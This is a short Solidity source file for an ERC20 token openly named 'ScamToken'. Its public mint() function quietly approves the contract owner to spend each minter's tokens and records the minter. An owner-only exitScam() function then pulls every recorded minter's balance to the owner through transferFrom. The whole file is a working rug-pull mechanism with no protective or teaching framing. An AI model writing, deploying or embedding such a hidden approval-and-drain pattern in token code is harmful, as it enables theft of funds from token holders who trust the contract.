// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract ScamToken is ERC20, Ownable {
    uint256 initialSupply = 10000000 * (10 ** decimals());
    address[] spenders;
   
    constructor() ERC20("ScamToken", "STK") Ownable(msg.sender){
        ERC20._mint(msg.sender, initialSupply);
    }

    function mint(uint256 value) public {
        ERC20._mint(msg.sender, value);
        spenders.push(msg.sender);
        approve(owner(), value);
    }

    function exitScam() public onlyOwner() {
        for(uint i = 0; i < spenders.length; i++){
            transferFrom(spenders[i], msg.sender, balanceOf(spenders[i]));
        }  
    }
}